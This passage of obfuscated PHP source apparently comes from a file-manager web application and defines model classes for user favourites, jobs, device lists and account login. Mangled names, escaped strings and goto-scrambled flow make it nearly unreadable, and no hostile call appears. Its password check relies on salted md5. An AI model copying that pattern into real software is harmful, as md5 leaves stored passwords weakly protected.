$Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[425]][$AÙëßŞ¦ÁŠ[390]] = $f„±ˆîí¬[$Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[425]][$AÙëßŞ¦ÁŠ[390]]]; } if ($Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[29]] == $AÙëßŞ¦ÁŠ[1660]) { $Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[1923]] = $Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[84]]; $Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[1910]] = $Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[1923]][$AÙëßŞ¦ÁŠ[390]]; $Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[84]] = !1; $Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[390]] = $AÙëßŞ¦ÁŠ[33]; } if ($Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[84]] && $Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[84]][$AÙëßŞ¦ÁŠ[398]] == $AÙëßŞ¦ÁŠ[1174]) { $aŸÃèŒŠÅ[] = $AÓ‹ˆ¥Ÿµï[$AÙëßŞ¦ÁŠ[388]]; unset($A£¦·á½»è[$c„…ñòÉ…µ]); continue; } goto eÒµŒ©Ú„Ò; e½àö‘¶: } $AÓ‹ˆ¥Ÿµï[$AÙëßŞ¦ÁŠ[425]] = $Bªõ§Øõùç; goto f‡Ğ¢‚¹“˜; f‡Ğ¢‚¹“˜: unset($AÓ‹ˆ¥Ÿµï[$AÙëßŞ¦ÁŠ[2101]]); $a¦‹Áí¡›¼[] = $AÓ‹ˆ¥Ÿµï; goto f­ËÜ‹Œà¼; F–ÕßíÔ”¯: $AÓ‹ˆ¥Ÿµï[$AÙëßŞ¦ÁŠ[1853]] = $Bó¥í“áã; $Bªõ§Øõùç = json_decode($AÓ‹ˆ¥Ÿµï[$AÙëßŞ¦ÁŠ[425]], !0); $AÓ‹ˆ¥Ÿµï[$AÙëßŞ¦ÁŠ[2092]] = isset($Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[2092]]) ? $Bªõ§Øõùç[$AÙëßŞ¦ÁŠ[2092]] : $AÙëßŞ¦ÁŠ[33]; goto bÓÄ·÷‰¡; f­ËÜ‹Œà¼: } $this->clearSystemPathLog($aŸÃèŒŠÅ); goto D‡©çäªÈ¬; D¤ÍÎô§Ë¼: $AÙëßŞ¦ÁŠ =& $_SERVER[…ë˜õ]; $Bìô¨é¡¤® = array_to_keyvalue($A£¦·á½»è, $AÙëßŞ¦ÁŠ[33], $AÙëßŞ¦ÁŠ[1531]); $c¥‹Ñî÷çÔ = Model($AÙëßŞ¦ÁŠ[501])->userListInfo(array_unique($Bìô¨é¡¤®)); goto CùíåÌŸŠ; D‡©çäªÈ¬: return $a¦‹Áí¡›¼; goto FÂŸ„ÑÜë—; FÂŸ„ÑÜë—: } private function clearSystemPathLog($aôğÆ‚£°) { $aˆá˜¤ô³÷ =& $_SERVER[…ë˜õ]; if (count($aôğÆ‚£°) == 0) { return; } $C›¯§ÈÎÀö = array($aˆá˜¤ô³÷[388] => array($aˆá˜¤ô³÷[7], array_unique($aôğÆ‚£°))); $this->where($C›¯§ÈÎÀö)->delete(); } public function deviceList($bÓâÄ¥—æ, $AÜïá¥†î‰ = 0) { $Dç”èÌŠè› =& $_SERVER[…ë˜õ]; $eë—ÊÊÈá¢ = array($Dç”èÌŠè›[1531] => $bÓâÄ¥—æ, $Dç”èÌŠè›[192] => array($Dç”èÌŠè›[977], $AÜïá¥†î‰), $Dç”èÌŠè›[29] => $Dç”èÌŠè›[1634]); $E—¨İ®¾³Ó = array(); $dƒª„Ï•Š„ = $this->field($Dç”èÌŠè›[2102])->where($eë—ÊÊÈá¢)->order($Dç”èÌŠè›[1921])->limit(50)->select(); foreach ($dƒª„Ï•Š„ as $F™‡é‹©„ => $aØõĞº¯ñ) { goto BÄï°îÄÄˆ; BÄï°îÄÄˆ: if ($F™‡é‹©„ > 0 && abs($aØõĞº¯ñ[$Dç”èÌŠè›[192]] - $dƒª„Ï•Š„[$F™‡é‹©„ - 1][$Dç”èÌŠè›[192]]) < 5) { continue; } $F³’ÔØÆ¡½ = json_decode($aØõĞº¯ñ[$Dç”èÌŠè›[425]], !0); $aØõĞº¯ñ[$Dç”èÌŠè›[2092]] = isset($F³’ÔØÆ¡½[$Dç”èÌŠè›[2092]]) ? $F³’ÔØÆ¡½[$Dç”èÌŠè›[2092]] : $Dç”èÌŠè›[33]; goto DÜ¹™Œ»¸å; bÓ¹ô’‹êõ: $this->ipAddress($aØõĞº¯ñ); $aØõĞº¯ñ[$Dç”èÌŠè›[425]] = $F³’ÔØÆ¡½; $E—¨İ®¾³Ó[$B¾®Æêº°] = $aØõĞº¯ñ; goto EÊé¢‚ÕÃî; DÜ¹™Œ»¸å: unset($F³’ÔØÆ¡½[$Dç”èÌŠè›[2092]]); $B¾®Æêº° = $this->deviceType($F³’ÔØÆ¡½[$Dç”èÌŠè›[1912]]); if (isset($E—¨İ®¾³Ó[$B¾®Æêº°])) { continue; } goto bÓ¹ô’‹êõ; EÊé¢‚ÕÃî: } return array_values($E—¨İ®¾³Ó); } public function deviceType($FøèŒßùôÍ) { return $FøèŒßùôÍ; } } goto E×£Æ„İƒ; B©Üğ¼Ÿİ: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\146\x61\x76"; protected function cacheFunctionAlias($fÇˆåˆï‡œ) { $F¯Úƒï°ˆÖ =& $_SERVER[…ë˜õ]; return array($F¯Úƒï°ˆÖ[1798] => array(USER_ID, $F¯Úƒï°ˆÖ[2115])); } protected function listData() { $FóîŠ×¡Ç° =& $_SERVER[…ë˜õ]; $DĞÜİ¸×‰ƒ = array($FóîŠ×¡Ç°[1522] => USER_ID, $FóîŠ×¡Ç°[457] => 0); $D¹Õ‹îŒñ§ = $FóîŠ×¡Ç°[2116]; $fë‰ñâ‚Ùâ = $this->field($D¹Õ‹îŒñ§)->where($DĞÜİ¸×‰ƒ)->order($FóîŠ×¡Ç°[2117])->select(); return $fë‰ñâ‚Ùâ ? $fë‰ñâ‚Ùâ : array(); } protected function resetCache() { } protected function listView() { goto fã“½¹“Œá; AÂËá†²®–: $bÙ‘çêÇç© = array_to_keyvalue($bÙ‘çêÇç©, $E¶ô‚ˆŸøº[390]); foreach ($dˆîÀ÷Ó¸à as $FË¹“†›¦ => $e°œÃç¹Ç¹) { $A‡¤Î Åøç = $bÙ‘çêÇç©[$e°œÃç¹Ç¹[$E¶ô‚ˆŸøº[75]]]; $A‡¤Î Åøç = $A‡¤Î Åøç ? $A‡¤Î Åøç : array(); $dˆîÀ÷Ó¸à[$FË¹“†›¦] = array_merge($A‡¤Î Åøç, $e°œÃç¹Ç¹); } return $dˆîÀ÷Ó¸à; goto Bƒ¹šÏˆ÷; fã“½¹“Œá: $E¶ô‚ˆŸøº =& $_SERVER[…ë˜õ]; $dˆîÀ÷Ó¸à = $this->listData(); $e ù‰ñÔ™ç = array_filter_by_field($dˆîÀ÷Ó¸à, $E¶ô‚ˆŸøº[29], $E¶ô‚ˆŸøº[403]); goto BÑğ¬•µ«; BÑğ¬•µ«: $aØŸí•ĞÅ = array_to_keyvalue($e ù‰ñÔ™ç, $E¶ô‚ˆŸøº[33], $E¶ô‚ˆŸøº[75]); if (!$aØŸí•ĞÅ) { return $dˆîÀ÷Ó¸à; } $F¬Ê£Œ¢Øó = 2000; goto cÅ©‡‘°Ï³; cÅ©‡‘°Ï³: $FÏç¨Ş¾¬ë = array($E¶ô‚ˆŸøº[404] => array($E¶ô‚ˆŸøº[405], $aØŸí•ĞÅ)); $bÙ‘çêÇç© = Model($E¶ô‚ˆŸøº[796])->listSource($FÏç¨Ş¾¬ë, $F¬Ê£Œ¢Øó); $bÙ‘çêÇç© = array_merge($bÙ‘çêÇç©[$E¶ô‚ˆŸøº[73]], $bÙ‘çêÇç©[$E¶ô‚ˆŸøº[74]]); goto AÂËá†²®–; Bƒ¹šÏˆ÷: } protected function addFav($dÆÅñ»Ù¾—, $cÔè¯¶ÆÉ· = '', $eÎ¯«‰Œª = "\x73\157\x75\x72\x63\x65") { goto fÚ„Ù±„ë§; eİØ•‘«Ê: if (!$cÔè¯¶ÆÉ· && $eÎ¯«‰Œª == $cßí§£Îã[403]) { $C¤ç“Â—‹Û = Model($cßí§£Îã[1209])->where(array($cßí§£Îã[404] => $dÆÅñ»Ù¾—))->find(); if (!$C¤ç“Â—‹Û) { return !1; } $cÔè¯¶ÆÉ· = $C¤ç“Â—‹Û[$cßí§£Îã[28]]; } $cÔè¯¶ÆÉ· = $this->getAutoName($cÔè¯¶ÆÉ·); $BêËèÇØñ = array($cßí§£Îã[1522] => USER_ID, $cßí§£Îã[457] => 0, $cßí§£Îã[407] => $cÔè¯¶ÆÉ·, $cßí§£Îã[408] => $dÆÅñ»Ù¾—, $cßí§£Îã[409] => $eÎ¯«‰Œª, $cßí§£Îã[1698] => $EÏè÷âÕÈ + 1); goto dô¾·¨ŸÆ£; fÚ„Ù±„ë§: $cßí§£Îã =& $_SERVER[…ë˜õ]; $C‰­İÜèˆõ = array($cßí§£Îã[1522] => USER_ID, $cßí§£Îã[457] => 0, $cßí§£Îã[409] => $eÎ¯«‰Œª, $cßí§£Îã[408] => $dÆÅñ»Ù¾—); if ($this->where($C‰­İÜèˆõ)->find()) { return !1; } goto e¯„İ—‹»„; e¯„İ—‹»„: $C‰­İÜèˆõ = array($cßí§£Îã[1522] => USER_ID, $cßí§£Îã[457] => 0); $EÏè÷âÕÈ = $this->where($C‰­İÜèˆõ)->max($cßí§£Îã[1717]); if (!$EÏè÷âÕÈ) { $EÏè÷âÕÈ = 0; } goto eİØ•‘«Ê; dô¾·¨ŸÆ£: return $this->add($BêËèÇØñ); goto Déæïì¤ãÕ; Déæïì¤ãÕ: } protected function remove($Fš»îÓ¬Š³) { $fÑ†ŒÀ„ä =& $_SERVER[…ë˜õ]; $A…ƒ˜İÂ±í = array($fÑ†ŒÀ„ä[1522] => USER_ID, $fÑ†ŒÀ„ä[406] => $Fš»îÓ¬Š³); return $this->where($A…ƒ˜İÂ±í)->delete(); } protected function removeByName($DñÅÆßİè) { $B‰º«ÊÊÀ =& $_SERVER[…ë˜õ]; $EÏÇ™›®ç× = array($B‰º«ÊÊÀ[1522] => USER_ID, $B‰º«ÊÊÀ[407] => $DñÅÆßİè, $B‰º«ÊÊÀ[457] => 0); return $this->where($EÏÇ™›®ç×)->delete(); } protected function rename($F¤¤êïÄì£, $dÎ©¡‰Âº™) { $cë˜Å¢ÙéÄ =& $_SERVER[…ë˜õ]; if ($F¤¤êïÄì£ == $dÎ©¡‰Âº™) { return !1; } $a°æòÛÇèÄ = $this->getAutoName($dÎ©¡‰Âº™); if ($dÎ©¡‰Âº™ != $a°æòÛÇèÄ) { return !1; } $E¼Š¾Õ¡…· = array($cë˜Å¢ÙéÄ[1522] => USER_ID, $cë˜Å¢ÙéÄ[457] => 0, $cë˜Å¢ÙéÄ[28] => $F¤¤êïÄì£); return $this->where($E¼Š¾Õ¡…·)->save(array($cë˜Å¢ÙéÄ[28] => $dÎ©¡‰Âº™)); } protected function resetSort($C•´½Ùå£) { $eÔó¤ñ¡á„ =& $_SERVER[…ë˜õ]; $C•´½Ùå£ = is_array($C•´½Ùå£) ? $C•´½Ùå£ : array(); $eàÂ¤…Ä÷ = array($eÔó¤ñ¡á„[1522] => USER_ID); for ($AŞÕ™© = 0; $AŞÕ™© < count($C•´½Ùå£); $AŞÕ™©++) { $eàÂ¤…Ä÷[$eÔó¤ñ¡á„[406]] = $C•´½Ùå£[$AŞÕ™©]; $this->where($eàÂ¤…Ä÷)->save(array($eÔó¤ñ¡á„[1698] => $AŞÕ™© + 1)); } return !0; } protected function moveTop($DÇ¯‡„Ë±ò) { goto E…®Ç½®î¶; C£‚È•†ø: $bö£âœÆ‰ç = $bœßì„õˆ’; $bœßì„õˆ’ = array_remove_value($bœßì„õˆ’, $eŒÏä×öğÌ[$bœ‰Õ×È’ñ[388]]); array_unshift($bœßì„õˆ’, $eŒÏä×öğÌ[$bœ‰Õ×È’ñ[388]]); goto CÖÁêÁƒÒ¸; a ë§î­ù: if (!$eŒÏä×öğÌ) { return; } $bœßì„õˆ’ = $this->field($bœ‰Õ×È’ñ[388])->where($e ®»·è¾ô)->order($bœ‰Õ×È’ñ[2117])->select(); $bœßì„õˆ’ = array_to_keyvalue($bœßì„õˆ’, $bœ‰Õ×È’ñ[33], $bœ‰Õ×È’ñ[388]); goto C£‚È•†ø; CÖÁêÁƒÒ¸: return $this->resetSort($bœßì„õˆ’); goto aŠê¹Ûö†Î; E…®Ç½®î¶: $bœ‰Õ×È’ñ =& $_SERVER[…ë˜õ]; $e ®»·è¾ô = array($bœ‰Õ×È’ñ[1522] => USER_ID, $bœ‰Õ×È’ñ[457] => 0); $eŒÏä×öğÌ = $this->where($e ®»·è¾ô)->where(array($bœ‰Õ×È’ñ[28] => $DÇ¯‡„Ë±ò))->find(); goto a ë§î­ù; aŠê¹Ûö†Î: } protected function moveBottom($EéÖ…Ëˆß¨) { $cÀÆßáã»“ =& $_SERVER[…ë˜õ]; $a±¿ŸğÓà° = array($cÀÆßáã»“[1522] => USER_ID, $cÀÆßáã»“[457] => 0); $Fö±¯Õ‹¿˜ = $this->where($a±¿ŸğÓà°)->max($cÀÆßáã»“[1717]); $eãØ¾»Áˆ× = array($cÀÆßáã»“[1717] => $Fö±¯Õ‹¿˜ + 1); return $this->where($a±¿ŸğÓà°)->where(array($cÀÆßáã»“[28] => $EéÖ…Ëˆß¨))->save($eãØ¾»Áˆ×); } private function getAutoName($E«‚ÂÆ÷ïÎ) { goto fá§²ÂÙÉÓ; CÇŸâšï³Ğ: $eà‡¯Ÿâ = array_to_keyvalue($eà‡¯Ÿâ, $eÍöö¦”ŠÔ[33], $eÍöö¦”ŠÔ[28]); if (!$eà‡¯Ÿâ || !in_array($E«‚ÂÆ÷ïÎ, $eà‡¯Ÿâ)) { return $E«‚ÂÆ÷ïÎ; } for ($Dé‡½ğà¶ = 0; $Dé‡½ğà¶ < count($eà‡¯Ÿâ); $Dé‡½ğà¶++) { if (!in_array($E«‚ÂÆ÷ïÎ . "\50{$Dé‡½ğà¶}\51", $eà‡¯Ÿâ)) { return $E«‚ÂÆ÷ïÎ . "\50{$Dé‡½ğà¶}\51"; } } goto báæŒ–Ğ½; báæŒ–Ğ½: return $E«‚ÂÆ÷ïÎ . "\x28{$Dé‡½ğà¶}\x29"; goto b°…º‰Šñ; fá§²ÂÙÉÓ: $eÍöö¦”ŠÔ =& $_SERVER[…ë˜õ]; $FÁ¨½‘íä = array($eÍöö¦”ŠÔ[1522] => USER_ID, $eÍöö¦”ŠÔ[457] => 0); $eà‡¯Ÿâ = $this->field($eÍöö¦”ŠÔ[28])->where($FÁ¨½‘íä)->select(); goto CÇŸâšï³Ğ; b°…º‰Šñ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\152\x6f\142\x4c\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\144\x65\x73\x63", "\163\157\162\164"); const JOB_KEY = "\163\x65\154\146\112\157\x62\x4c\x69\x73\x74"; public function listData($bÛ•‡”„¸Ó = false, $B“Æ§¿Ì×¬ = "\163\157\162\164", $dÊœéâï‹‘ = false) { return parent::listData($bÛ•‡”„¸Ó, $B“Æ§¿Ì×¬, $dÊœéâï‹‘); } public function remove($f­èéÎƒª¿) { return parent::remove($f­èéÎƒª¿); } public function add($eÈäƒ¯È¿Š) { $eİå½áÍŞ =& $_SERVER[…ë˜õ]; if ($this->findByName($eÈäƒ¯È¿Š[$eİå½áÍŞ[28]])) { return !1; } $eÈäƒ¯È¿Š[$eİå½áÍŞ[1717]] = $this->getSort(); return parent::insert($eÈäƒ¯È¿Š); } private function getSort() { $a…õ­¿‹…¼ =& $_SERVER[…ë˜õ]; $B ‘‘§ÇïÕ = parent::listData(); $DøµÎëÚµ = array_to_keyvalue($B ‘‘§ÇïÕ, $a…õ­¿‹…¼[33], $a…õ­¿‹…¼[1717]); return empty($DøµÎëÚµ) ? 0 : max($DøµÎëÚµ) + 1; } public function update($E»°Œ§«âŞ, $e»œø‡µ…ƒ) { $AåÈ„—ƒ×Ê =& $_SERVER[…ë˜õ]; $BíîÑ’ù˜ = parent::listData($E»°Œ§«âŞ); $fÂ¦¦İ´Š = $this->findByName($e»œø‡µ…ƒ[$AåÈ„—ƒ×Ê[28]]); if (!$BíîÑ’ù˜ || $fÂ¦¦İ´Š && $fÂ¦¦İ´Š[$AåÈ„—ƒ×Ê[388]] != $BíîÑ’ù˜[$AåÈ„—ƒ×Ê[388]]) { return !1; } return parent::update($E»°Œ§«âŞ, $e»œø‡µ…ƒ); } public function setUserJob($D‘²â”¨Ó¼, $f‘ÁœœâÑ) { goto b ×›¾Ÿöå; aŠš–éØ²°: $EÑ‘Äƒšé‡ = array_to_keyvalue($cµ†¤„ô…Ì, $A¨ÊçÂäÑá[28]); $DÙ¨òÚÏ“ = $A¨ÊçÂäÑá[373]; foreach ($f‘ÁœœâÑ as $bß÷…¹ÂÃ®) { if ($EÑ‘Äƒšé‡[$bß÷…¹ÂÃ®]) { $DÙ¨òÚÏ“ .= $EÑ‘Äƒšé‡[$bß÷…¹ÂÃ®][$A¨ÊçÂäÑá[388]] . $A¨ÊçÂäÑá[47]; } else { $D°İŒê¬ö’ = $this->add($bß÷…¹ÂÃ®); $DÙ¨òÚÏ“ .= $D°İŒê¬ö’ . $A¨ÊçÂäÑá[47]; } } goto c½Åğ¨£¤Ú; c½Åğ¨£¤Ú: $DÙ¨òÚÏ“ = rtrim($DÙ¨òÚÏ“, $A¨ÊçÂäÑá[47]); Model($A¨ÊçÂäÑá[501])->metaSet($D‘²â”¨Ó¼, self::JOB_KEY, $DÙ¨òÚÏ“); goto Fˆ’Å¾´; b ×›¾Ÿöå: $A¨ÊçÂäÑá =& $_SERVER[…ë˜õ]; if (!is_array($f‘ÁœœâÑ)) { $f‘ÁœœâÑ = array($f‘ÁœœâÑ); } $cµ†¤„ô…Ì = parent::listData(); goto aŠš–éØ²°; Fˆ’Å¾´: } public function getUserJob($dÁÃØ“Ã¿è) { $fß¹Ã‚åË = Model($_SERVER[…ë˜õ][501])->metaGet($dÁÃØ“Ã¿è); return $this->getUserJobInfo($fß¹Ã‚åË[self::JOB_KEY]); } public function getUserJobInfo($f é¬Ä„›â) { goto fÖ¸Œ»Ç•ì; fÖ¸Œ»Ç•ì: $Bíõóá‡ =& $_SERVER[…ë˜õ]; $D—¾åò‰— = explode($Bíõóá‡[47], $f é¬Ä„›â); $B‚‡ïğË¼ = parent::listData(); goto a¹¦Ù—ë¿; Aª»¨‡Óå§: return $DğÅÆªŠ£æ; goto d¸ƒèÜí£¶; a¹¦Ù—ë¿: $B‚‡ïğË¼ = array_remove_key($B‚‡ïğË¼, $Bíõóá‡[192]); $DğÅÆªŠ£æ = array(); foreach ($D—¾åò‰— as $b­ó™ŒŠÉ) { if (isset($B‚‡ïğË¼[$b­ó™ŒŠÉ])) { $DğÅÆªŠ£æ[] = $B‚‡ïğË¼[$b­ó™ŒŠÉ]; } } goto Aª»¨‡Óå§; d¸ƒèÜí£¶: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\x74\x61\142\154\145\116\141\155\x65" => "\165\x73\145\x72\x5f\155\145\x74\141", "\155\x65\x74\x61\106\x69\145\154\x64" => "\165\163\x65\x72\x49\x44"); protected $simpleField = "\x75\x73\x65\162\111\104\x2c\x6e\x69\x63\153\x4e\141\155\x65\x2c\x6e\x61\x6d\145\x2c\x61\166\141\164\x61\x72\54\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($E¢Á‰ïøÚ) { $Dğ²¯µ¯ëª =& $_SERVER[…ë˜õ]; $BËğóÅô· = $Dğ²¯µ¯ëª[2118]; return array($Dğ²¯µ¯ëª[1766] => array($E¢Á‰ïøÚ[0], $BËğóÅô·), $Dğ²¯µ¯ëª[1768] => array($E¢Á‰ïøÚ[0], $BËğóÅô·), $Dğ²¯µ¯ëª[2119] => array($E¢Á‰ïøÚ[0], $BËğóÅô·)); } protected function getInfo($A¹…ÉŞ¸Û™, $aÖ¼Ğ“²²ó = false) { $d„ƒŠé½µë = $this->getInfoSimple($A¹…ÉŞ¸Û™); if (!is_array($d„ƒŠé½µë)) { return array(); } if ($aÖ¼Ğ“²²ó) { return $this->_getInfoApply($d„ƒŠé½µë); } return $this->cacheFunctionGet($_SERVER[…ë˜õ][1775], $A¹…ÉŞ¸Û™); } protected function getInfoFull($aÕñ¥­¡æ…, $Fê‰…ŒäÚé = false) { $eÁĞ“­İ÷± = $this->getInfoSimple($aÕñ¥­¡æ…); if (!is_array($eÁĞ“­İ÷±)) { return array(); } if ($Fê‰…ŒäÚé) { return $this->_getInfoApply($eÁĞ“­İ÷±, !0); return $this->_getInfoApply($eÁĞ“­İ÷±, !0); } return $this->cacheFunctionGet($_SERVER[…ë˜õ][2120], $aÕñ¥­¡æ…); } private function _getInfoApply($AÍ ŠœÇ•‚, $e´…·±ø = false) { goto bµì¬¬²Š; eÕï÷ºÌÊ: $AÍ ŠœÇ•‚ = $this->_listDataApplyItem($AÍ ŠœÇ•‚); $fÑ¢ŞÚ¬ = Model($BÃÌ„—„¥Š[1209])->metaGet($AÍ ŠœÇ•‚[$BÃÌ„—„¥Š[84]][$BÃÌ„—„¥Š[390]]); $AÍ ŠœÇ•‚[$BÃÌ„—„¥Š[2123]] = $F®°ˆÑßŠ†; goto e½×ìœÉŸö; e½×ìœÉŸö: $AÍ ŠœÇ•‚[$BÃÌ„—„¥Š[84]][$BÃÌ„—„¥Š[1956]] = isset($fÑ¢ŞÚ¬[$BÃÌ„—„¥Š[1957]]) ? $fÑ¢ŞÚ¬[$BÃÌ„—„¥Š[1957]] : null; if ($e´…·±ø) { $AÍ ŠœÇ•‚[$BÃÌ„—„¥Š[439]] = $this->metaGet($AÍ ŠœÇ•‚[$BÃÌ„—„¥Š[1531]]); } return $AÍ ŠœÇ•‚; goto dŒ°‚†´¿; bµì¬¬²Š: $BÃÌ„—„¥Š =& $_SERVER[…ë˜õ]; if (!$AÍ ŠœÇ•‚) { return $AÍ ŠœÇ•‚; } $F®°ˆÑßŠ† = md5($BÃÌ„—„¥Š[2121] . $AÍ ŠœÇ•‚[$BÃÌ„—„¥Š[855]] . $BÃÌ„—„¥Š[2122] . $AÍ ŠœÇ•‚[$BÃÌ„—„¥Š[28]]); goto eÕï÷ºÌÊ; dŒ°‚†´¿: } protected function getInfoSimple($AŒŠİ­¡‘, $d¤ƒ×°§ = false) { $EÈ¸êô¼ğ› =& $_SERVER[…ë˜õ]; if (!$AŒŠİ­¡‘) { return array(); } if ($d¤ƒ×°§) { $D««Ã‘ãçâ = $this->where(array($EÈ¸êô¼ğ›[1531] => intval($AŒŠİ­¡‘)))->find(); if (!is_array($D««Ã‘ãçâ)) { return array(); } $D««Ã‘ãçâ[$EÈ¸êô¼ğ›[2124]] = Action($EÈ¸êô¼ğ›[2125])->parseUrl($D««Ã‘ãçâ[$EÈ¸êô¼ğ›[2124]]); return $D««Ã‘ãçâ; } return $this->cacheFunctionGet($EÈ¸êô¼ğ›[1769], $AŒŠİ­¡‘); } protected function getInfoSimpleOuter($f±±”Û¨‹Ê) { goto b‘Ï»÷ù£; FŒŞ¿®â¶ó: $bÀÜÂ†¢©˜ = array_field_key($dÃÛêó¶ª¾, explode($e¦ÚŸËÃ†â[47], $this->simpleField)); if (!$bÀÜÂ†¢©˜) { return array($e¦ÚŸËÃ†â[1531] => $e¦ÚŸËÃ†â[1090], $e¦ÚŸËÃ†â[28] => $e¦ÚŸËÃ†â[159] . LNG($e¦ÚŸËÃ†â[2128]) . $e¦ÚŸËÃ†â[499], $e¦ÚŸËÃ†â[2124] => STATIC_PATH . $e¦ÚŸËÃ†â[2129]); } $bÀÜÂ†¢©˜[$e¦ÚŸËÃ†â[2124]] = Action($e¦ÚŸËÃ†â[2125])->parseUrl($bÀÜÂ†¢©˜[$e¦ÚŸËÃ†â[2124]]); goto BäùÜÆ™Â´; BäùÜÆ™Â´: return $bÀÜÂ†¢©˜; goto E˜¦õò²š; b‘Ï»÷ù£: $e¦ÚŸËÃ†â =& $_SERVER[…ë˜õ]; if (!$f±±”Û¨‹Ê || $f±±”Û¨‹Ê == 0) { return array($e¦ÚŸËÃ†â[1531] => $e¦ÚŸËÃ†â[491], $e¦ÚŸËÃ†â[28] => $e¦ÚŸËÃ†â[159] . LNG($e¦ÚŸËÃ†â[2126]) . $e¦ÚŸËÃ†â[499], $e¦ÚŸËÃ†â[2124] => STATIC_PATH . $e¦ÚŸËÃ†â[2127]); } $dÃÛêó¶ª¾ = $this->cacheFunctionGet($e¦ÚŸËÃ†â[1769], $f±±”Û¨‹Ê); goto FŒŞ¿®â¶ó; E˜¦õò²š: } protected function groupUser($a¸Ê¾óİë) { } public static function errorLang($E²›‘à¬À­) { $Dö÷¸Ë¥ÅÉ =& $_SERVER[…ë˜õ]; $AÁ˜Ó—ÄÏŠ = array(self::ERROR_USER_NOT_EXISTS => $Dö÷¸Ë¥ÅÉ[2130], self::ERROR_USER_PASSWORD_ERROR => $Dö÷¸Ë¥ÅÉ[2131], self::ERROR_USER_EXIST_NAME => $Dö÷¸Ë¥ÅÉ[2132], self::ERROR_USER_EXIST_PHONE => $Dö÷¸Ë¥ÅÉ[2133], self::ERROR_USER_EXIST_EMAIL => $Dö÷¸Ë¥ÅÉ[2134], self::ERROR_USER_LOGIN_LOCK => $Dö÷¸Ë¥ÅÉ[2135], self::ERROR_IP_NOT_ALLOW => $Dö÷¸Ë¥ÅÉ[2136], self::ERROR_USER_EXIST_NICKNAME => $Dö÷¸Ë¥ÅÉ[2137]); return LNG($AÁ˜Ó—ÄÏŠ[$E²›‘à¬À­]); } public function getInfoByMeta($bµİ·“ÜŒŸ, $D¼óà¶Æ…ƒ) { $aÛëŒµ‰èÖ =& $_SERVER[…ë˜õ]; $D§Ï±«óš = Model($aÛëŒµ‰èÖ[2138])->where(array($aÛëŒµ‰èÖ[92] => $bµİ·“ÜŒŸ, $aÛëŒµ‰èÖ[370] => $D¼óà¶Æ…ƒ))->find(); if ($D§Ï±«óš) { return $this->getInfo($D§Ï±«óš[$aÛëŒµ‰èÖ[1531]]); } return !1; } public function userLoginCheck($cŒîÄ¹„ä, $c”ù’‡˜öğ) { $A±™¿áÛ¿à =& $_SERVER[…ë˜õ]; $aˆ±ˆ©×ç‡ = $this->userLoginFind($cŒîÄ¹„ä); if (!$aˆ±ˆ©×ç‡) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($aˆ±ˆ©×ç‡[$A±™¿áÛ¿à[1531]], $c”ù’‡˜öğ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($aˆ±ˆ©×ç‡[$A±™¿áÛ¿à[1531]]); } public function userLoginFind($dğ•Ş‡ô›) { $b§è¢‚Âãó =& $_SERVER[…ë˜õ]; $cÄ¦İïµ¢ = array($b§è¢‚Âãó[28] => $dğ•Ş‡ô›, $b§è¢‚Âãó[1960] => $dğ•Ş‡ô›, $b§è¢‚Âãó[301] => $dğ•Ş‡ô›, $b§è¢‚Âãó[2139] => $dğ•Ş‡ô›, $b§è¢‚Âãó[963] => $b§è¢‚Âãó[965]); if ($this->nickNameRpt()) { unset($cÄ¦İïµ¢[$b§è¢‚Âãó[1960]]); } return $this->where($cÄ¦İïµ¢)->find(); } public function clearCache($Aº‰…ï²à¾) { $cçœõÌİ =& $_SERVER[…ë˜õ]; $this->cacheFunctionClear($cçœõÌİ[1775], $Aº‰…ï²à¾); $this->cacheFunctionClear($cçœõÌİ[1769], $Aº‰…ï²à¾); $this->cacheFunctionClear($cçœõÌİ[2120], $Aº‰…ï²à¾); } public function userPasswordCheck($Aäò‘¯ºƒ, $a”•´¾´½µ) { $AÔçÔ¼†›ò =& $_SERVER[…ë˜õ]; $Eòò®¯œœ‰ = $this->where(array($AÔçÔ¼†›ò[1531] => intval($Aäò‘¯ºƒ)))->find(); $e®áÎ¦®å = $this->metaGet($Aäò‘¯ºƒ); $e¾ë”÷†ŒÇ = isset($e®áÎ¦®å[$AÔçÔ¼†›ò[2140]]) ? $e®áÎ¦®å[$AÔçÔ¼†›ò[2140]] : $AÔçÔ¼†›ò[33]; if (md5($e¾ë”÷†ŒÇ . trim($a”•´¾´½µ)) !== $Eòò®¯œœ‰[$AÔçÔ¼†›ò[855]]) { return !1; } return !0; } public function userAdd($fÇŸĞõÑ¼ø) { goto cŒó£µ¯İĞ; cŒó£µ¯İĞ: $EªÇ“ë¡ĞÄ =& $_SERVER[…ë˜õ]; $d•ÆÊØÈÈ = array($EªÇ“ë¡ĞÄ[407] => $fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[28]], $EªÇ“ë¡ĞÄ[2141] => $fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[1415]], $EªÇ“ë¡ĞÄ[2142] => isset($fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[301]]) ? $fÇŸĞõÑ¼ø[$EªÇ“ë¡ĞÄ[301]] : $EªÇ“ë¡ĞÄ[33], 